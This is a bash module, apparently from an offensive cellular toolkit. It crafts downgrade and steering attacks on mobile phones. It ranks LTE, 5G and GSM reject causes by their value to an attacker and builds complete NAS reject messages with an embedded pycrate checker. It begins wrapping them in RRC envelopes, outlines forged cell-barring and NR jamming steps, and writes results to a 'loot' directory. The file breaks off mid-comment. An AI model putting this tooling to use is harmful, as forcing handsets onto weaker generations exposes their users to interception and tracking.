#!/usr/bin/env bash
# Cross-generation downgrade and steering attacks
#
# The reject causes and algorithm identifiers in this module are the real
# assigned values, taken from the specifications:
#
#   TS 24.301 §9.9.3.9     EMM cause values (LTE Attach/TAU Reject)
#   TS 24.501 §9.11.3.2   5GMM cause values (Registration Reject)
#   TS 24.008 §10.5.5.14   GMM cause values (GSM/UMTS)
#   TS 24.008 §10.5.5.12   reject causes for the CS domain
#   TS 33.401 §5.4.2.1     EPS ciphering: EEA0..EEA2 / EIA0..EIA2
#   TS 33.501 §5.5.2       NR ciphering: NEA0..NEA3 / NIA0..NIA3
#   TS 33.102 §6.6         UMTS: UEA0..UEA2 / UIA0..UIA2
#   TS 43.020 / 44.018     GSM: A5/0 (clear) through A5/3
#
# What an attacker with a radio can do here is suppress a higher-RAT cell so
# the UE falls back to a generation that is weaker — a forged SIB with
# cellBarred set, or a jammer on the NR downlink. What a core-side attacker
# can do is answer an attach with a reject cause that steers the UE away.
# This module performs the encodings for real and writes plan files for the
# parts that need a radio or a testbed.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec HOME=/root even though we write to the invoking user's tree.
# Reset HOME so $HOME-relative defaults resolve to the real user.
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

DWN_CAPABLE=1
# Guarded: when the launcher sources every module into one shell, an
# unconditional definition here would clobber the launcher's own banner.
declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

MOD_TMP="$TMP_DIR/downgrade"
DWN_DIR="$LOOT_DIR/downgrade"
DWN_PLAN_DIR="$DWN_DIR/plans"
DWN_FINDINGS="$DWN_DIR/findings.tsv"
# Where a private SDR inventory may be pinned, in the same shape modules/
# 10_lte_air.sh:59 uses for LAIR_SDR.
DWN_SDR="${TMP_DIR}/sdr_device"
mkdir -p "$MOD_TMP" "$DWN_DIR" "$DWN_PLAN_DIR" 2>/dev/null

# ── sanitisation ────────────────────────────────────────────────────────
dwn_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

# ── reject causes ───────────────────────────────────────────────────────
# Table: cause:rat:name:effect:steering_value
# `steering_value` is how useful the cause is to an attacker trying to move
# a UE down a generation: high = the UE is pushed off this RAT.
dwn_causes() {
    cat << 'EOF'
# EMM (LTE), TS 24.301 9.9.3.9
2:EMM:IMSI unknown in HSS:UE is rejected, no steering effect:low
3:EMM:Illegal UE:UE is rejected and may blacklist the PLMN:low
5:EMM:IMEI not accepted:equipment rejected:low
6:EMM:Illegal ME:equipment rejected:low
7:EMM:EPS services not allowed:UE falls back to 2G/3G for CS services:high
8:EMM:EPS and non-EPS services not allowed:UE may detach entirely:medium
9:EMM:UE identity cannot be derived by the network:re-registration with IMSI:low
10:EMM:Implicitly detached:UE must re-attach:low
11:EMM:PLMN not allowed:PLMN is added to the forbidden list:high
12:EMM:Tracking area not allowed:TA is forbidden for EPS, UE reselects another RAT:high
13:EMM:Roaming not allowed in this tracking area:roaming UE is steered away:high
14:EMM:EPS services not allowed in this PLMN:EPS is barred in this PLMN:high
15:EMM:No suitable cells in tracking area:the classic steering cause, UE looks elsewhere:high
19:EMM:ESM failure:session-level failure, combined with a PDN reject:low
20:EMM:MAC failure:authentication failure:low
21:EMM:Synch failure:replay protection triggered:low
22:EMM:Congestion:UE backs off and may fall back:medium
23:EMM:UE security capabilities mismatch:security negotiation failure:low
24:EMM:Security mode rejected, unspecified:security negotiation failure:low
25:EMM:Not authorized for this CSG:CSG restriction:low
# 5GMM (NR), TS 24.501 9.11.3.2
3:5GMM:Illegal UE:UE is rejected:low
5:5GMM:PEI not accepted:equipment rejected:low
6:5GMM:Illegal ME:equipment rejected:low
7:5GMM:5GS services not allowed:UE falls back to EPS or lower:high
9:5GMM:UE identity cannot be derived by the network:re-registration with SUCI:low
10:5GMM:Implicitly de-registered:UE must re-register:low
11:5GMM:PLMN not allowed:PLMN forbidden for 5GS:high
12:5GMM:Tracking area not allowed:TA forbidden for 5GS:high
13:5GMM:Roaming not allowed in this tracking area:roaming UE steered away:high
15:5GMM:No suitable cells in tracking area:UE is pushed off NR:high
22:5GMM:Congestion:backoff, possible fallback:medium
23:5GMM:UE security capabilities mismatch:security negotiation failure:low
24:5GMM:Security mode rejected, unspecified:security negotiation failure:low
27:5GMM:N1 mode not allowed:the UE disables NR capability — a direct 5G to 4G downshift:high
31:5GMM:Redirection to EPC required:explicit instruction to move to LTE:high
72:5GMM:Non-3GPP access to 5GCN not allowed:access-type restriction:low
73:5GMM:Serving network not authorized:SN not trusted for this UE:medium
# GMM (GSM/UMTS), TS 24.008 10.5.5.14
2:GMM:IMSI unknown in HLR:UE rejected:low
3:GMM:Illegal MS:UE rejected:low
4:GMM:IMEI not accepted:equipment rejected:low
5:GMM:Illegal ME:equipment rejected:low
6:GMM:GPRS services not allowed:UE falls back to GSM CS only:high
7:GMM:GPRS services and non-GPRS services not allowed:UE detaches:medium
8:GMM:MS identity cannot be derived by the network:identity re-request:low
11:GMM:PLMN not allowed:PLMN forbidden:high
12:GMM:Location area not allowed:LA forbidden:high
13:GMM:Roaming not allowed in this location area:roaming UE steered away:high
22:GMM:Congestion:backoff:medium
EOF
}

# Look up a cause for a generation.
dwn_cause_row() {
    local rat="${1:-}" n="${2:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    dwn_causes | grep -v '^#' | awk -F: -v r="$rat" -v c="$n" '$1==c && $2==r {print; exit}'
}

dwn_cause_name() {
    local rat="${1:-}" n="${2:-}"
    dwn_cause_row "$rat" "$n" | awk -F: '{print $3}'
}

dwn_cause_effect() {
    local rat="${1:-}" n="${2:-}"
    dwn_cause_row "$rat" "$n" | awk -F: '{print $4}'
}

dwn_cause_steering() {
    local rat="${1:-}" n="${2:-}"
    dwn_cause_row "$rat" "$n" | awk -F: '{print $5}'
}

# A rejected cause arrives as one octet in the reject message. The cause
# information element has an identifier in each generation's IE table --
# EMM cause 0x53 (TS 24.301 §9.9.3.9), 5GMM cause 0x59 (TS 24.501 §9.11.3.2),
# GMM cause 0x13 (TS 24.008 §10.5.5.14) -- but in a reject message that IE is
# carried as a MANDATORY type-3 IE, and a mandatory type-3 IE on the wire is
# just its value: the position (the octet after the message type) identifies it.
# So the identifier is reported as cause_ie for reference and the octets that
# actually go on the wire are the value alone. pycrate draws the same
# distinction: its EMMAttachReject models the cause as
# Type3V('EMMCause', ...) ("mandatory IE, its content is a simple buffer", no
# tag octet) while the accept messages that DO send the tag use
# Type3TV('EMMCause', val={'T':0x53, 'V':...}) -- and its encoder emits 07440F
# for an attach reject with cause 15, never 0744530F.
dwn_reject_encoding() {
    local rat="${1:-}" cause="${2:-}"
    local row; row=$(dwn_cause_row "$rat" "$cause")
    if [[ -z "$row" ]]; then
        printf 'ERROR\tno %s cause %s in the assigned table\n' \
            "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$cause")" >&2
        return 1
    fi
    local name effect steer
    name=$(awk -F: '{print $3}' <<<"$row")
    effect=$(awk -F: '{print $4}' <<<"$row")
    steer=$(awk -F: '{print $5}' <<<"$row")
    local iei proto
    case "$rat" in
        EMM)  iei=0x53; proto="EMM (LTE Attach/TAU Reject)" ;;
        5GMM) iei=0x59; proto="5GMM (5G Registration Reject)" ;;
        GMM)  iei=0x13; proto="GMM (GPRS Attach/RAU Reject)" ;;
        *)    return 1 ;;
    esac
    printf 'rat\t%s\n'          "$rat"
    printf 'cause\t%s\n'        "$cause"
    printf 'cause_hex\t%02X\n'  "$cause"
    printf 'name\t%s\n'         "$(dwn_sanitize "$name")"
    printf 'protocol\t%s\n'     "$proto"
    printf 'cause_ie\t0x%02X\n' "$iei"
    printf 'cause_ie_on_wire\tno\n'
    printf 'wire_octets\t%02X\n' "$cause"
    printf 'cause_ie_role\tmandatory type-3 IE in a reject: the tag is not transmitted\n'
    printf 'effect\t%s\n'       "$(dwn_sanitize "$effect")"
    printf 'steering_value\t%s\n' "$steer"
}

# ── the reject MESSAGE, not just its cause octet ────────────────────────
# A cause octet on its own is not a message: a UE only reads it inside a
# complete NAS reject. The encodings are fixed, so the layout is written out
# from the spec and then asserted against an outside decoder:
#
#   TS 24.301 §8.2.1 / Table 9.8.1 EMM message header: octet 1 is the security
#     header type (0000 = plain NAS, bits 4-1) under the protocol discriminator
#     (0111 = EPS mobility management, bits 8-5), so it reads 0x07; octet 2 is
#     the message type: 0x44 = ATTACH REJECT, 0x4B = TRACKING AREA UPDATE
#     REJECT, 0x4E = SERVICE REJECT. The EMM cause IE (§9.9.3.9) is a
#     mandatory type-3 information element, so the octet after the message type
#     IS the cause value and it carries no tag octet of its own.
#   TS 24.501 §9.7 / §9.11.3.2 5GMM: a three-octet header. Octet 1 is the
#     extended protocol discriminator alone (0111 1110 = 5GS mobility
#     management, so 0x7E); octet 2 is the spare half octet in bits 8-5 and the
#     security header type in bits 4-1 (0x00 = plain NAS); octet 3 is the
#     message type, 0x44 = REGISTRATION REJECT, 0x4D = SERVICE REJECT. The 5GMM
#     cause then follows as the octet after the message type.
#   TS 24.008 §9.4.1 / Table 10.4 / §10.5.5.14 GMM: octet 1 is the skip
#     indicator in the high nibble (0000) and the protocol discriminator in the
#     low nibble (1000 = GPRS mobility management), so 0x08; octet 2 is the
#     message type, 0x04 = GMM ATTACH REJECT, 0x0B = ROUTING AREA UPDATE
#     REJECT, 0x0E = GMM SERVICE REJECT; the GMM cause follows it.
#
# Message types were NOT taken from a reading of the tables alone: pycrate
# 0.8.1 vendors all three specs as executable Python (pycrate_mobile.NAS,
# TS24301_EMM, TS24501_FGMM, TS24008_GMM), and encoding each reject class at its
# declared defaults gives
#   EMMAttachReject 074411   EMMTrackingAreaUpdateReject 074b11
#   EMMServiceReject 074e11  GMMAttachReject 080411
#   GMMRoutingAreaUpdateReject 080b11                        GMMServiceReject 080e11
#   FGMMRegistrationReject 7e004416   FGMMServiceReject 7e004d16
# which is where the octets above come from. The first draft of this table was
# written from the tables alone and was wrong in four places (EMM TAU 0x45, GMM
# attach 0x06, GMM RAU 0x08) and right in a fifth only by accident; the selftest
# now pins every one of them to the pycrate-derived value.
#
# The GMM header byte is the one a table reading got backwards here, and a
# second independent dissector settled it: Wireshark's GSM A-I/F DTAP dissector
# reads byte 1 of 08 04 11 as ".... 1000 = Protocol discriminator: GPRS mobility
# management messages (0x8)" with "0000 .... = Skip Indicator: ... (0)", i.e.
# the discriminator is the LOW nibble, and it reads 80 04 11 as a (GCC) message
# instead. So the wire byte is 0x08, which is also what pycrate emits.
#
# The whole message is produced by this tree's own arithmetic and then handed to
# that outside decoder (dwn_nas_decode_oracle), never read back with the code
# that built it.
dwn_nas_msg_type() {
    local rat="${1:-}" kind="${2:-attach}"
    case "$rat:$kind" in
        EMM:attach)   printf '0x44\tATTACH REJECT\n' ;;
        EMM:tau)      printf '0x4B\tTRACKING AREA UPDATE REJECT\n' ;;
        EMM:service)  printf '0x4E\tSERVICE REJECT\n' ;;
        5GMM:attach)  printf '0x44\t5GMM REGISTRATION REJECT\n' ;;
        5GMM:tau)     printf '0x44\t5GMM REGISTRATION REJECT\n' ;;
        5GMM:service) printf '0x4D\t5GMM SERVICE REJECT\n' ;;
        GMM:attach)   printf '0x04\tGMM ATTACH REJECT\n' ;;
        GMM:tau)      printf '0x0B\tROUTING AREA UPDATE REJECT\n' ;;
        GMM:service)  printf '0x0E\tGMM SERVICE REJECT\n' ;;
        *) return 1 ;;
    esac
}

dwn_nas_reject_build() {
    local rat="${1:-}" cause="${2:-}" kind="${3:-attach}"
    case "$rat" in EMM|5GMM|GMM) ;; *) return 1 ;; esac
    [[ "$cause" =~ ^[0-9]+$ ]] || return 1
    local row; row=$(dwn_cause_row "$rat" "$cause")
    [[ -n "$row" ]] || return 1
    local mt; mt=$(dwn_nas_msg_type "$rat" "$kind" 2>/dev/null) || return 1
    local mt_hex="${mt%%	*}" mt_name="${mt#*	}"

    # The cause rides as a bare value octet after the message type: it is a
    # mandatory type-3 IE, so its identifier is not transmitted (see the note
    # above dwn_reject_encoding). pycrate's encoder produces 07440F for cause
    # 15, not 0744530F, and Wireshark reads 07440F back as Attach reject with
    # EMM cause 15.
    local iei
    case "$rat" in
        EMM)  iei=0x53 ;;
        5GMM) iei=0x59 ;;
        GMM)  iei=0x13 ;;
    esac

    # Header octets. TS 24.301 packs the security header type and the
    # protocol discriminator into one octet (0x07 = plain NAS + EPS mobility
    # management). TS 24.501 gives the discriminator its own octet (0x7E = 5GS
    # mobility management) and follows it with the spare half octet beside the
    # security header (0x00 = plain NAS) before the message type, so its header
    # is THREE octets. TS 24.008 puts the discriminator 1000 in the LOW nibble
    # of octet 1 with the skip indicator 0000 in the high nibble (0x08, as
    # Wireshark's DTAP dissector reads it and as pycrate encodes it).
    local mt_dec=$(( mt_hex ))
    local -a hdr=()
    case "$rat" in
        EMM)  hdr=(0x07 "$mt_dec") ;;
        5GMM) hdr=(0x7E 0x00 "$mt_dec") ;;
        GMM)  hdr=(0x08 "$mt_dec") ;;
    esac
    local hdr_hex="" h
    for h in "${hdr[@]}"; do hdr_hex+="${hdr_hex:+ }$(printf '%02X' "$h")"; done
    local msg_hex=""
    for h in "${hdr[@]}"; do msg_hex+="$(printf '%02X' "$h")"; done
    msg_hex+="$(printf '%02X' "$cause")"
    local msg_octets=$(( ${#hdr[@]} + 1 ))

    printf 'rat\t%s\n'             "$rat"
    printf 'cause\t%s\n'           "$cause"
    printf 'cause_hex\t%02X\n'     "$cause"
    printf 'name\t%s\n'            "$(dwn_sanitize "$(dwn_cause_name "$rat" "$cause")")"
    printf 'protocol\t%s\n'        "$(dwn_reject_encoding "$rat" "$cause" | awk -F'\t' '$1=="protocol"{print $2}')"
    printf 'msg_kind\t%s\n'        "$kind"
    printf 'msg_type\t%s\n'        "$mt_hex"
    printf 'msg_type_hex\t%s\n'    "$(printf '%02X' "$mt_hex")"
    printf 'msg_name\t%s\n'        "$mt_name"
    printf 'hdr_octets\t%d\n'      "${#hdr[@]}"
    printf 'hdr_hex\t%s\n'         "$hdr_hex"
    printf 'cause_ie\t0x%02X\n'    "$iei"
    printf 'cause_ie_on_wire\tno\n'
    printf 'cause_wire_octet\t%02X\n' "$cause"
    printf 'msg_octets\t%d\n'      "$msg_octets"
    printf 'msg_hex\t%s\n'         "$msg_hex"
    printf 'msg_bits\t%d\n'        "$(( msg_octets * 8 ))"
    printf 'msg_layout\tTS 24.301 Table 9.8.1 + 9.9.3.9 / TS 24.501 9.7 + 9.11.3.2 / TS 24.008 Table 10.4 + 10.5.5.14\n'
    printf 'msg_bytes\t%s\n'       "$msg_hex"
}

# The independent decoder this message is asserted against. pycrate vendors the
# 3GPP NAS specs as executable Python (pycrate_mobile.NAS), so its
# EMMAttachReject is a second implementation of TS 24.301 -- not this tree's
# arithmetic read back to itself. The script is written out here rather than
# added to tools/ because this module owns exactly one file.
dwn_nas_oracle_script() {
    local dst="$1"
    cat > "$dst" <<'DWN_NAS_ORACLE'
#!/usr/bin/env python3
"""Decode NAS reject messages with pycrate (independent of this tree).

pycrate_mobile vendors TS 24.301 / TS 24.501 / TS 24.008 as executable Python,
so its reject classes are a second implementation of the same messages -- the
same independent-oracle shape tools/lte-rrc-oracle and tools/lte-per-oracle use
for RRC and PER. Two assertions are made, and both come from pycrate:

  encode -- pycrate encodes the class from its OWN declared header defaults
            with the cause the CALLER states; the bytes this tree produced
            must equal that encoding, or be a prefix of it when pycrate's
            grammar mandates an optional IE this tree deliberately omits (GMM
            RAU reject carries a ForceStdby nibble, TS 24.008 9.4.15, that is
            optional on the air). The cause is an argument and never read out
            of the message under test, so an encoder that echoes the bytes
            cannot make a wrong cause compare equal to itself.
  decode -- pycrate parses the bytes this tree produced and hands back the
            header fields and the cause. A wrong discriminator, a wrong
            message type or a wrong cause octet changes what it prints.

Usage:  nas_oracle.py <rat> <kind> <cause> <msg_hex>
        nas_oracle.py --batch        (stdin: rat<TAB>kind<TAB>cause<TAB>hex,
                                      rows prefixed with the 1-based line no)

The message is never compared against this tree's own arithmetic.
"""
import sys

# rat:kind -> pycrate class. Mirrors dwn_nas_msg_type() in the shell module.
CLASSES = {
    ("EMM", "attach"): "EMMAttachReject",
    ("EMM", "tau"): "EMMTrackingAreaUpdateReject",
    ("EMM", "service"): "EMMServiceReject",
    ("5GMM", "attach"): "FGMMRegistrationReject",
    ("5GMM", "tau"): "FGMMRegistrationReject",
    ("5GMM", "service"): "FGMMServiceReject",
    ("GMM", "attach"): "GMMAttachReject",
    ("GMM", "tau"): "GMMRoutingAreaUpdateReject",
    ("GMM", "service"): "GMMServiceReject",
}

# Which half octet each protocol keeps its discriminator in: the security
# header type / skip indicator, then the protocol discriminator.
HDR = {
    "EMM": ("SecHdr", "ProtDisc"),
    "5GMM": ("SecHdr", "EPD"),
    "GMM": ("SkipInd", "ProtDisc"),
}


def unwrap(v):
    while isinstance(v, (list, tuple)) and len(v) == 1:
        v = v[0]
    return v


def cause_of(msg):
    for e in msg._content[1:]:
        if "Cause" in e._name:
            return unwrap(e.get_val())
    return None


def decode_one(rat, kind, cause_s, hexs):
    """(ok, rows) for one message. rows is a list of (key, value)."""
    cls = CLASSES.get((rat, kind))
    if cls is None:
        return False, [("ERROR", "no pycrate class for %s %s" % (rat, kind))]
    if not cause_s.isdigit() or not 0 <= int(cause_s) <= 255:
        return False, [("ERROR", "cause must be 0..255, got %r" % cause_s)]
    if not hexs or len(hexs) % 2 or any(c not in "0123456789abcdefABCDEF"
                                         for c in hexs):
        return False, [("ERROR", "not an even-length hex string: %r" % hexs)]
    raw = bytes.fromhex(hexs)
    try:
        import pycrate_mobile.NAS as NAS
    except Exception as exc:
        return False, [("ERROR", "pycrate is not importable here: %s" % exc)]
    klass = getattr(NAS, cls, None)
    if klass is None:
        return False, [("ERROR", "pycrate has no class %s" % cls)]

    rows = [("oracle", "pycrate %s" % cls), ("nas_bytes", raw.hex().upper()),
            ("nas_octets", len(raw)), ("want_cause", int(cause_s))]

    # -- encode side: pycrate's own default header + the caller's cause ------
    enc = klass()
    enc_ok = False
    enc_bytes = b""
    try:
        for e in enc._content[1:]:
            if "Cause" in e._name:
                e.set_val([int(cause_s)])
                enc_ok = True
                break
        if enc_ok:
            enc_bytes = enc.to_bytes()
    except Exception as exc:
        rows.append(("encode_error", str(exc).replace("\t", " ")[:120]))
    if enc_ok:
        want = enc_bytes.hex().upper()
        got = raw.hex().upper()
        if got == want:
            match = "exact"
        elif want.startswith(got) and len(want) > len(got):
            match = "prefix"
        else:
            match = "none"
        rows += [("pycrate_bytes", want), ("pycrate_octets", len(enc_bytes)),
                 ("match", match),
                 ("extra_octets", (len(enc_bytes) - len(raw))
                  if match == "prefix" else 0),
                 ("pycrate_header_fields",
                  ",".join(e._name for e in enc._content[0]._content))]
    else:
        rows.append(("match", "no-cause-in-grammar"))

    # -- decode side: does pycrate accept THESE bytes, and read them back? ---
    dec = klass()
    try:
        dec.from_bytes(raw)
    except Exception as exc:
        rows += [("decode", "refused"),
                 ("decode_error", str(exc).replace("\t", " ")[:120])]
        return True, rows
    h = dec._content[0]
    fields = {}
    for e in h._content:
        if not getattr(e, "_content", None):
            fields[e._name] = e.get_val()
    rows.append(("decode", "ok"))
    sname, pname = HDR[rat]
    rows.append(("security_header_type",
                 "" if fields.get(sname) is None else fields.get(sname)))
    rows.append(("protocol_discriminator", fields.get(pname, "")))
    mt = fields.get("Type", "")
    rows.append(("message_type", mt))
    rows.append(("message_type_hex", "%02X" % mt if isinstance(mt, int) else ""))
    c = cause_of(dec)
    rows.append(("cause", "" if c is None else c))
    rows.append(("cause_present", "yes" if c is not None else "no"))
    # The read-back cause must be the one asked for, independently of the
    # byte comparison above.
    rows.append(("cause_readback_ok",
                 "yes" if c is not None and int(c) == int(cause_s) else "no"))
    return True, rows


def emit(rows):
    sys.stdout.write("".join("%s\t%s\n" % (k, v) for k, v in rows))


def main(argv):
    if argv and argv[0] == "--batch":
        import io
        n = 0
        for line in io.TextIOWrapper(sys.stdin.buffer, "utf-8"):
            line = line.rstrip("\n")
            if not line:
                continue
            n += 1
            parts = line.split("\t")
            if len(parts) != 4:
                sys.stderr.write("ERROR\tline %d: need 4 tab fields\n" % n)
                return 1
            ok, rows = decode_one(*parts)
            if not ok:
                sys.stderr.write("ERROR\tline %d: %s\t%s\n"
                                 % (n, rows[0][0], rows[0][1]))
                return 1
            sys.stdout.write("".join("%d\t%s\t%s\n" % (n, k, v)
                                     for k, v in rows))
        return 0
    if len(argv) != 4:
        sys.stderr.write("ERROR\tusage: nas_oracle.py <rat> <kind> <cause>"
                         " <msg_hex> | nas_oracle.py --batch\n")
        return 1
    ok, rows = decode_one(*argv)
    if not ok:
        sys.stderr.write("ERROR\t%s\n" % rows[0][1])
        return 1
    emit(rows)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
DWN_NAS_ORACLE
}

# dwn_nas_oracle_py: the interpreter that can actually import pycrate, or
# non-zero with the reason on stderr. A box without it cannot assert the LTE
# message against an outside implementation, and the caller must say so rather
# than skip the assertion quietly.
dwn_nas_oracle_py() {
    local want="${DWN_NAS_ORACLE_PY:-}" c
    # DWN_NAS_ORACLE_PY wins; then the venv this tree's own RRC/SIB oracles
    # use (tools/check-lte-sib-codec.sh:49 and tools/asn1gen.py both hardcode
    # /home/ysl/.lte-oracles/venv/bin/python, overridable with LTE_ORACLE_PY);
    # then a venv beside the tree; then whatever `python3` is.
    for c in "$want" "${LTE_ORACLE_PY:-}" \
             "$HOME/.lte-oracles/venv/bin/python" \
             "$IMSISTING_ROOT/tools/../.venv/bin/python3" \
             "$IMSISTING_ROOT/venv/bin/python3" /tmp/pycvenv/bin/python3 \
             python3; do
        [[ -n "$c" ]] || continue
        [[ -x "$c" || "$c" == "python3" ]] || continue
        if "$c" -c 'import pycrate_mobile.NAS' >/dev/null 2>&1; then
            printf '%s\n' "$c"; return 0
        fi
    done
    printf 'ERROR\tno interpreter with pycrate_mobile found (tried %s); set DWN_NAS_ORACLE_PY to one\n' \
        "${DWN_NAS_ORACLE_PY:-unset, LTE_ORACLE_PY, ~/.lte-oracles, .venv, venv, /tmp/pycvenv, python3}" >&2
    return 1
}

# dwn_nas_decode_oracle <rat> <kind> <cause> <msg_hex>: hand ONE reject message
# to pycrate, which parses the bytes this tree built and separately encodes the
# same class from its own grammar with the cause the CALLER states. Prints the
# parsed header and cause, the pycrate encoding, and whether the two agree
# (exact/prefix/none). The cause is an argument so that a wrong cause octet
# shows up as match=none instead of the encoder faithfully echoing it.
dwn_nas_decode_oracle() {
    local rat="${1:-}" kind="${2:-}" cause="${3:-}" hexs="${4:-}"
    [[ "$rat" =~ ^(EMM|5GMM|GMM)$ ]] || {
        printf 'ERROR\tdwn_nas_decode_oracle needs rat EMM|5GMM|GMM\n' >&2
        return 2; }
    [[ "$kind" =~ ^(attach|tau|service)$ ]] || {
        printf 'ERROR\tdwn_nas_decode_oracle needs kind attach|tau|service\n' >&2
        return 2; }
    [[ "$cause" =~ ^[0-9]+$ ]] && (( cause <= 255 )) || {
        printf 'ERROR\tdwn_nas_decode_oracle needs a cause 0..255\n' >&2
        return 2; }
    [[ "$hexs" =~ ^[0-9A-Fa-f]+$ && $(( ${#hexs} % 2 )) -eq 0 ]] || {
        printf 'ERROR\tneed an even-length hex string\n' >&2; return 2; }
    local py; py=$(dwn_nas_oracle_py) || return 1
    # Always rewritten, never reused: a stale copy under a shared TMP_DIR from
    # an older revision of this module silently changed the oracle's own CLI
    # once ("usage: nas_oracle.py <rat> <kind> <msg_hex>"), and an oracle that
    # is quietly the wrong revision is worse than no oracle at all.
    local pyf="$MOD_TMP/nas_oracle_v3.py"
    dwn_nas_oracle_script "$pyf" || return 1
    "$py" "$pyf" "$rat" "$kind" "$cause" "$hexs"
}

# dwn_nas_decode_oracle_batch: assert MANY messages in ONE pycrate process.
# Each oracle invocation pays pycrate's import (measured 6.2s here), so the
# selftest feeds every reject class through one run instead of nine: the
# assertions are identical, the interpreter start is paid once.
# stdin: rat<TAB>kind<TAB>cause<TAB>msg_hex per line; stdout rows are
# "<line number><TAB><key><TAB><value>" so a caller can pick a line's field.
dwn_nas_decode_oracle_batch() {
    local py; py=$(dwn_nas_oracle_py) || return 1
    local pyf="$MOD_TMP/nas_oracle_v3.py"
    dwn_nas_oracle_script "$pyf" || return 1
    "$py" "$pyf" --batch
}

# ── the RRC envelope that carries it to a UE ────────────────────────────
# The reject has to arrive inside a downlink RRC message. TS 36.331 §10.5
# puts a NAS PDU in DLInformationTransfer, whose message type is 0x34, but
# the DL-DCCH-Message envelope is what a UE has to read first and what a
# packet analyser dissects: DL-DCCH-MessageType is a non-extensible CHOICE
# whose `c1` alternative (bit 0) is a 16-alternative CHOICE in which
# rrcConnectionReconfiguration is number 4 (00100 in unaligned PER) -- the
# same five-bit envelope tools/lte_rrc.py builds for HandoverCommand, and the
# same bits pycrate asserts in tools/lte-rrc-oracle/verify_rrc.py.
dwn_dl_dcch_prefix() { printf '00100\n'; }

dwn_rrc_dl_dcch() {
    local hexs="${1:-}" bits="${2:-}"
    [[ "$hexs" =~ ^[0-9A-Fa-f]+$ && $(( ${#hexs} % 2 )) -eq 0 ]] || {
        printf 'ERROR\tdwn_rrc_dl_dcch needs an even-length hex PDU\n' >&2; return 2; }
    python3 - "$hexs" "$bits" <<'PY'
import sys
hexs, blen = sys.argv[1].upper(), sys.argv[2]
bits = "".join(format(int(c, 16), "04b") for c in hexs)
# The true bit length is what tools/lte_rrc.py measured; the hex is padded out
# to whole octets, so trim the padding bits rather than trust the hex length.
if blen.isdigit() and 0 < int(blen) <= len(bits):
    bits = bits[:int(blen)]
pre = "00100"
body = pre + bits
pad = -len(body) % 8
raw = bytes(int((body + "0" * pad)[i:i + 8], 2) for i in range(0, len(body) + pad, 8))
print("dl_dcch_prefix\t%s" % pre)
print("dl_dcch_prefix_dec\t%d" % int(pre, 2))
print("rrc_pdu_hex\t%s" % hexs)
print("rrc_pdu_bits\t%d" % len(bits))
print("rrc_pdu_octets\t%d" % ((len(bits) + 7) // 8))
print("dl_dcch_pad_bits\t%d" % pad)
print("dl_dcch_bits\t%d" % len(body))
print("dl_dcch_octets\t%d" % len(raw))
print("dl_dcch_hex\t%s" % raw.hex().upper())
print("dl_dcch_layout\tTS 36.331 10.5 DL-DCCH-Message (unaligned PER)")
PY
}

# ── the DLInformationTransfer the reject actually rides in ──────────────
# A reject is not carried by an RRCConnectionReconfiguration: TS 36.331 §10.5
# gives the NAS PDU its own message, DLInformationTransfer, whose
# DLInformationTransfer-r8-IEs carry a `dedicatedInfoType` CHOICE that selects
# `dedicatedInfoNAS` (a DedicatedInfoNAS OCTET STRING). The bits below are
# written out from those definitions, not copied from a captured PDU. Each
# field is listed with the bits it contributes:
#
#   DL-DCCH-Message ::= SEQUENCE { message DL-DCCH-MessageType }
#     DL-DCCH-MessageType is an extensible CHOICE: 1 extension bit (0 = no
#     extension addition) then the c1 CHOICE index in 4 bits. Inside c1,
#     dlInformationTransfer is alternative 1 (0001) -- the same five-bit
#     envelope shape tools/lte_rrc.py builds for rrcConnectionReconfiguration,
#     where alternative 4 gives 00100.
#   DLInformationTransfer ::= SEQUENCE {
#     rrc-TransactionIdentifier RRC-TransactionIdentifier,   INTEGER (0..3)
#     criticalExtensions CHOICE { c1 CHOICE { dlInformationTransfer-r8,
#       dlInformationTransfer-r15, spare2, spare1 } } }
#     unaligned PER: 2 bits of transaction id; then the criticalExtensions
#     CHOICE index (1 bit, 0 = c1); then the c1 CHOICE index (2 bits, 00 =
#     dlInformationTransfer-r8).
#   DLInformationTransfer-r8-IEs ::= SEQUENCE { ... ,
#     dedicatedInfoType CHOICE { dedicatedInfoNAS DedicatedInfoNAS,
#       dedicatedInfoCDMA2000-1XRTT ..., dedicatedInfoCDMA2000-HRPD ... },
#     nonCriticalExtension DLInformationTransfer-v8a0-IEs OPTIONAL }
#     the SEQUENCE is extensible, so an extension bit (0 = no extension
#     additions); then the dedicatedInfoType CHOICE index (2 bits, 00 =
#     dedicatedInfoNAS); then the OCTET STRING itself -- an unconstrained
